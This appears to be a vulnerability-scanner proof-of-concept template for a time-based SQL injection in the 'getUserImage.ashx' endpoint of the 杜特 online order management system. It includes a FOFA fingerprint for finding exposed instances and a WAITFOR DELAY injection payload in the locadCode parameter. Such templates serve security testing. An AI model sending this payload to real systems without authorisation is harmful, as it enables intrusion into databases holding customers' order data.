id: poc-yaml-tutor-ooms-getuserimage-ashx-sqli
info:
  name: 杜特网上订单管理系统 getUserImage.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 杜特网上订单管理系统
  fofa: app="TUTORSOFT-ERP"
variables:
  t1: random_int(4,9)
  t2: t1 + 2
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"欢迎登陆到网上订单系统")
- method: GET
  path: /ajax/getUserImage.ashx?locadCode=admin%27/**/and(select+1)>0waitfor/**/delay%270:0:{{.t1}}
  expression: status_code == 200 && body == "" && contains(content_type,"image/pjpeg")
    && duration > t1 && duration < t2
transport: http
